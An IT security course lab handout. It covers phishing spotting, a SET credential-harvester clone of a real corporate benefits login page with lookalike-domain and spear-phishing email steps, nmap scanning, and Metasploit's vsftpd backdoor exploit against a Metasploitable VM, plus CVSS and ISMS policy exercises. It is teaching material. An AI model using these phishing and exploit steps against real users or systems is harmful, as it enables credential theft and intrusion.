# LAB: Introduction to IT Security

## Detecting Phishing Emails (10 min)

Use the following quiz to practice identifying phishing emails:
https://phishingquiz.withgoogle.com/


---

## Social Engineering Attack Simulation (20 min)

In this lab, you will simulate a social engineering attack using a phishing website to demonstrate how attackers can trick users into revealing sensitive information.

We want to fake the login page of a well-known service (e.g., Bosch Corporate Benefits) and create a spear phishing email to lure users into entering their credentials.

### 1. Choose a Phishing Domain

Think of a domain name that closely resembles the legitimate service's domain. Te legitimate site is "bosch.mitarbeiterangebote.de".
You can check free domains on websites like https://www.checkdomain.de.

### 2. Prepare the Phishing Site

We will use the Social-Engineer Toolkit (SET) to create a phishing site that mimics a legitimate login page.

1. Start the Social-Engineer Toolkit:
   ```bash
   sudo setoolkit
   ```
2. Selet Website Attack Vectors (1)
3. Select Credential Harvester Attack Method (3)
4. Select Site Cloner (2)
5. Enter the URL of the legitimate site to clone:
   ```
   https://bosch.mitarbeiterangebote.de/login
   ```
6. Open your web browser and navigate to "http://localhost" to see the cloned site.
7. Enter (fake) credentials and submit the form. Observe the behavior.
8. Go back to the terminal where SET is running to view the captured credentials.

### 3. Formulate a Spear Phishing Email

Create a convincing email (DE or EN) that appears to come from a trusted source within the organization. Include a link to the cloned site.

The usage of AI tools is allowed to draft the email content.


---


## Vulnerability Scanning (45 minutes)

In this lab you will learn the typical workflow of vulnerability scanning and exploitation:

1. Discover a target system  
2. Identify open services and versions  
3. Research known vulnerabilities  
4. Select an appropriate exploit  
5. Exploit the system 

### Step 1: Start the Virtual Machines

1. Make sure the network settings are configured as follows:
   - it-security-training:
     - Adapter 1: NAT
     - Adapter 2: Host-only Adapter
   - metasploitable:
     - Adapter 1: Host-only Adapter
2. Start both virtual machines:
   - it-security-training
   - metasploitable
3. Wait until both systems have fully booted.
4. Log in to the it-security-training VM with:
   - Username: kali
   - Password: kali

### Step 2: Identify the Target IP Address

Before scanning or attacking, you must know where the target system is located in the network.

1. Check your own IP address:
    ```bash
    ip a
    ```
    Example:

    ```
    eth1: 192.168.56.101/24
    ```

    This means the network range is:

    ```
    192.168.56.0/24
    ```
    Write it down.
2. Discover hosts in the network using a nmap scan:
    ```bash
    nmap -sn <ip-range>
    ```
    You should see two “Oracle VirtualBox virtual NIC” hosts:
    - Your attacker VM
    - The target VM 
    Write down the target IP.

### Step 3: Scan the Target with Nmap

In this step, you will identify all open ports and running services, including their versions.

Run the following Nmap scan:

```bash
nmap -sV -p- <target-ip>
```

Explanation:
- `-sV` → service and version detection  
- `-p-` → scan all 65.535 TCP ports  

Review the output carefully and note the discovered services.

### Step 4: Focus on the FTP Service

Identify which FTP service and version is running on the target system.

#### Research Known Vulnerabilities

Search online for known vulnerabilities related to the identified FTP service and version.

Hints:
- Use search terms like <service-name> <version> vulnerability
- Look for CVEs or public exploit references

Write down your findings.

### Step 5: Exploitation with Metasploit

#### Start Metasploit

```bash
msfconsole
```

Wait until Metasploit finishes loading.

#### Search for a module

```text
search vsftpd
```

You should see an entry similar to:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

#### Select the exploit

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

#### View required options

```text
show options
```

Relevant options:
- `RHOSTS` → target IP address
- `RPORT` → FTP port (default: 21)

#### Configure the exploit

```text
set RHOSTS <target-ip>
```

#### Execute the Exploit

```text
run
```

If successful, you will receive a shell on the target system.

#### Verify Access

Inside the obtained shell:

```bash
whoami
```

```bash
ls
```

### Step 6: Interpretation

Reflect on the attack:
- What vulnerability was exploited?
- Why was exploitation possible?
- Which defensive measures could have prevented this attack?

Write down your observations.

### Step 7: Next Steps

After successfully exploiting the system, what would be your next steps as an attacker?

Write down a short list of possible next steps.

### Step 8: Cleanup

Shut down both virtual machines.



---

## CVSS Calculation (10 min)

In this lab, you will calculate the CVSS score for a given vulnerability scenario.

### Scenario

During an internal security assessment, a vulnerability was discovered in a custom-built HR web portal running on a Linux server.

The vulnerable functionality is part of a document upload feature that is only accessible to members of the HR department.
Access to the HR portal requires:
- A corporate user account
- Membership in the HR role
- VPN access

The HR portal is generally well protected and not accessible to regular employees or external users.

Due to insufficient server-side validation, an attacker with access to the HR portal can upload a specially crafted PHP file, which under certain conditions gets executed by the web server. Successful exploitation results in remote code execution with root privileges.

Exploitation:
- Requires deep technical knowledge of the application logic
- Requires precise timing and a specific server configuration
- Is not reliably exploitable and may fail multiple times

No user interaction is required beyond the attacker’s own actions.

After exploitation, the attacker can:
- Access and modify sensitive HR documents
- Modify system configuration and scripts

The system remains partially operational, but service stability is degraded.

The compromise does not automatically propagate to other systems.

### Task

Calculate the CVSS v3.1 base score using an online calculator (e.g., https://www.first.org/cvss/calculator/3.1)


---


## ISMS Policy Writing Exercise (30 minutes)

The goal of this exercise is to understand how information security requirements are translated into concrete security policies as part of an Information Security Management System (ISMS).

You will work in groups and create a short and practical security policy for a specific topic.


### Setup
- Form **5 groups**
- Each group represents the **IT security team** of a mid-sized company (~1.000 employees)
- Each group receives **one policy topic**

### Group Assignments

**Group 1 – Password Policy**  
Define rules for creating, using, and managing passwords.

**Group 2 – Endpoint Protection / Antivirus Policy**  
Define how malware protection is handled on company devices.

**Group 3 – Logging & Monitoring Policy**  
Define what is logged, monitored, and reviewed for security purposes.

**Group 4 – Backup Policy**  
Define how company data is backed up and restored.

**Group 5 – Secure AI Usage Policy**  
Define how AI tools (e.g. ChatGPT, Copilot) may be used in a corporate environment.



### Task

Write a **1-page security policy** for your assigned topic.

- Write in EN or DE
- Assume real-world constraints (time, budget, users)
- Length: ½ to 1 page

Your policy must include the following sections:

1. **Purpose**  
   - Why does this policy exist?
   - What security goal does it support?

2. **Scope**  
   - Who does this policy apply to?
   - Which systems, data, or devices are covered?

3. **Rules & Requirements**  
   - Clear and concrete rules
   - What is mandatory?
   - What is forbidden?
   - What is optional or requires approval?

4. **Responsibilities**  
   - Who is responsible for implementation?
   - Who is responsible for monitoring and enforcement?

5. **Non-Compliance** (short)  
   - What happens if the policy is violated?
